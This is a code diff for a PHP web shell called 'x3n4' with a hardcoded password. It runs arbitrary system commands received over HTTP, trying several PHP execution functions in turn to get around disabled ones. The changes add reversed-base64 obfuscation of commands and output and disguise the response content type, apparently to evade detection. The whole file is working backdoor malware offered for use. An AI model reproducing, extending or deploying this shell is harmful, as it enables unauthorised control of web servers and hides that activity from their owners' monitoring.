@@ -1,6 +1,7 @@
 <?php
 
 define('X3N4_VERSION', 'v0.1.7-alpha');
+define('X3N4_ENCRYPTION_ALGORITHM', 'rb64');
 
 $user = 'x3n4';
 $password = 'P455W0rd';
@@ -10,24 +11,24 @@ $password = 'P455W0rd';
  */
 function get_shell_prefix()
 {
-    return get_current_user() . '@' . php_uname('n') . ':' . getcwd() . ' $';
+    return get_user() . '@' . php_uname('n') . ':' . getcwd() . ' $';
 }
 function get_shell_command()
 {
     static $shell_command;
 
     if ($shell_command === null) {
-        if (is_callable('system') && !is_function_disabled('system')) {
+        if (is_function_available('system')) {
             $shell_command = 'system';
-        } elseif (is_callable('shell_exec') && !is_function_disabled('shell_exec')) {
+        } elseif (is_function_available('shell_exec')) {
             $shell_command = 'shell_exec';
-        } elseif (is_callable('exec') && !is_function_disabled('exec')) {
+        } elseif (is_function_available('exec')) {
             $shell_command = 'exec';
-        } elseif (is_callable('passthru') && !is_function_disabled('passthru')) {
+        } elseif (is_function_available('passthru')) {
             $shell_command = 'passthru';
-        } elseif (is_callable('proc_open') && !is_function_disabled('proc_open')) {
+        } elseif (is_function_available('proc_open')) {
             $shell_command = 'proc_open';
-        } elseif (is_callable('popen') && !is_function_disabled('popen')) {
+        } elseif (is_function_available('popen')) {
             $shell_command = 'popen';
         }
     }
@@ -36,6 +37,7 @@ function get_shell_command()
 }
 function execute_command($command)
 {
+    $command .= ' 2>&1';
     switch (get_shell_command()) {
         case 'system':
             ob_start();
@@ -65,7 +67,7 @@ function execute_command($command)
                 2 => array('pipe', 'w')
             );
 
-            $process = proc_open($command . ' 2>&1', $descriptors, $pipes, getcwd());
+            $process = proc_open($command, $descriptors, $pipes, getcwd());
 
             fclose($pipes[0]);
             $output = stream_get_contents($pipes[1]);
@@ -77,7 +79,7 @@ function execute_command($command)
             return $output;
 
         case 'popen':
-            $process = popen($command . ' 2>&1', 'r');
+            $process = popen($command, 'r');
             $output = fread($process, 4096);
             pclose($process);
             return $output;
@@ -99,9 +101,9 @@ function disabled_functions()
 
     return $disabled_fn;
 }
-function is_function_disabled($function)
+function is_function_available($function)
 {
-    return in_array($function, disabled_functions());
+    return is_callable($function) && !in_array($function, disabled_functions());
 }
 function output_json($output = '')
 {
@@ -111,10 +113,10 @@ function output_json($output = '')
         'stdout' => $output
     );
     if (is_callable('json_encode')) {
-        header('Content-Type: application/json;');
-        echo json_encode($output_data);
+        header('Content-Type: text/plain;');
+        echo encrypt(json_encode($output_data));
     } else {
-        echo $output_data['banner'], ' ', $_REQUEST['cmd'], PHP_EOL, $output;
+        echo encrypt($output_data['banner'] . ' ' . $_REQUEST['cmd'] . PHP_EOL . $output);
     }
     session_write_close();
     exit(0);
@@ -152,6 +154,37 @@ function get_motd()
 
     return 'Welcome to x3n4 '.X3N4_VERSION;
 }
+function encrypt($input) {
+    switch (X3N4_ENCRYPTION_ALGORITHM) {
+        case 'b64':
+            return base64_encode($input);
+
+        case 'rb64':
+            return strrev(base64_encode($input));
+    }
+    return $input;
+}
+function decrypt($input) {
+    switch (X3N4_ENCRYPTION_ALGORITHM) {
+        case 'b64':
+            return base64_decode($input);
+
+        case 'rb64':
+            return base64_decode(strrev($input));
+    }
+    return $input;
+}
+function get_user()
+{
+    if (
+        is_function_available('posix_getpwuid') &&
+        is_function_available('posix_getpid')
+    ) {
+        $info = posix_getpwuid(posix_getuid());
+        return $info['name'];
+    }
+    return getenv('USERNAME') ? getenv('USERNAME') : getenv('USER');
+}
 
 /**
  * CORE
@@ -164,7 +197,7 @@ if (!empty($_SESSION['pwd'])) {
 }
 
 if (isset($_REQUEST['cmd'])) {
-    $REQUESTED_CMD = trim(base64_decode($_REQUEST['cmd']));
+    $REQUESTED_CMD = trim(decrypt($_REQUEST['cmd']));
     if (empty($REQUESTED_CMD)) {
         exit(0);
     }
@@ -195,8 +228,8 @@ if (isset($_REQUEST['cmd'])) {
         }
     }
 
-    $output = execute_command($REQUESTED_CMD . ' 2>&1');
-    output_json(base64_encode($output));
+    $output = execute_command($REQUESTED_CMD);
+    output_json($output);
 }
 
 /**
@@ -267,7 +300,7 @@ if (isset($_REQUEST['cmd'])) {
                     </tr>
                     <tr>
                         <td>Current user:</td>
-                        <td><?php echo get_current_user(); ?></td>
+                        <td><?php echo get_user(); ?></td>
                     </tr>
                     <tr>
                         <td>Server IP:</td>
@@ -324,21 +357,38 @@ if (isset($_REQUEST['cmd'])) {
     <!-- Include all compiled plugins (below), or include individual files as needed -->
     <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
     <script>
-        // Create Base64 Object
-        var Base64={_keyStr:"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",encode:function(e){var t="";var n,r,i,s,o,u,a;var f=0;e=Base64._utf8_encode(e);while(f<e.length){n=e.charCodeAt(f++);r=e.charCodeAt(f++);i=e.charCodeAt(f++);s=n>>2;o=(n&3)<<4|r>>4;u=(r&15)<<2|i>>6;a=i&63;if(isNaN(r)){u=a=64}else if(isNaN(i)){a=64}t=t+this._keyStr.charAt(s)+this._keyStr.charAt(o)+this._keyStr.charAt(u)+this._keyStr.charAt(a)}return t},decode:function(e){var t="";var n,r,i;var s,o,u,a;var f=0;e=e.replace(/[^A-Za-z0-9+/=]/g,"");while(f<e.length){s=this._keyStr.indexOf(e.charAt(f++));o=this._keyStr.indexOf(e.charAt(f++));u=this._keyStr.indexOf(e.charAt(f++));a=this._keyStr.indexOf(e.charAt(f++));n=s<<2|o>>4;r=(o&15)<<4|u>>2;i=(u&3)<<6|a;t=t+String.fromCharCode(n);if(u!=64){t=t+String.fromCharCode(r)}if(a!=64){t=t+String.fromCharCode(i)}}t=Base64._utf8_decode(t);return t},_utf8_encode:function(e){e=e.replace(/rn/g,"n");var t="";for(var n=0;n<e.length;n++){var r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r)}else if(r>127&&r<2048){t+=String.fromCharCode(r>>6|192);t+=String.fromCharCode(r&63|128)}else{t+=String.fromCharCode(r>>12|224);t+=String.fromCharCode(r>>6&63|128);t+=String.fromCharCode(r&63|128)}}return t},_utf8_decode:function(e){var t="";var n=0;var r=c1=c2=0;while(n<e.length){r=e.charCodeAt(n);if(r<128){t+=String.fromCharCode(r);n++}else if(r>191&&r<224){c2=e.charCodeAt(n+1);t+=String.fromCharCode((r&31)<<6|c2&63);n+=2}else{c2=e.charCodeAt(n+1);c3=e.charCodeAt(n+2);t+=String.fromCharCode((r&15)<<12|(c2&63)<<6|c3&63);n+=3}}return t}}
-
         function x3n4 () {
             this.version = '<?php echo X3N4_VERSION; ?>';
             this.script_path = '<?php echo $_SERVER['REQUEST_URI']; ?>';
+            this.algo = '<?php echo X3N4_ENCRYPTION_ALGORITHM; ?>';
+            this.encrypt = function(input) {
+                switch (this.algo) {
+                    case 'b64':
+                        return window.btoa(input);
+                    case 'rb64':
+                        return window.btoa(input).split('').reverse().join('');
+                }
+                return input;
+            }
+            this.decrypt = function(input) {
+                switch (this.algo) {
+                    case 'b64':
+                        return window.atob(input);
+                    case 'rb64':
+                        return window.atob(input.split('').reverse().join(''));
+                }
+                return input;
+            }
             this.execCommand = function(command) {
                 if (command.trim() == 'clear') {
                     $('#stdout').html('');
                     return;
                 }
-                command = Base64.encode(command);
-                $('#stdout').append($('#pwd').html() + " " + Base64.decode(command) + "\n");
-                $.post(this.script_path, {cmd: command}, function(data) {
-                    $('#stdout').append(Base64.decode(data.stdout));
+                $('#stdout').append($('#pwd').html() + " " + command + "\n");
+                var that = this;
+                $.post(this.script_path, {cmd: this.encrypt(command)}, function(data) {
+                    data = JSON.parse(that.decrypt(data));
+                    $('#stdout').append(data.stdout);
                     $('#pwd').html(data.banner);
                     $('#stdout').scrollTop($('#stdout')[0].scrollHeight);
                 });
